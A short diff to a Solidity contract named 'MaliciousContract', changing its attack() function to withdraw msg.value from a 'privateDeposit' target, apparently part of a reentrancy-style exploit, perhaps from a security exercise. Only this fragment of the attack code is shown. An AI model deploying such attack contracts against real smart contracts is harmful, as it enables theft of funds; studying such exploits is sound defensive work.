@@ -13,7 +13,7 @@ contract MaliciousContract {
 
     function attack() public payable {
         require(!attackInitiated, "Attack already initiated");
-        privateDeposit.CashOut(1 ether);
+        privateDeposit.CashOut(msg.value);
         attackInitiated = true;
 
     }
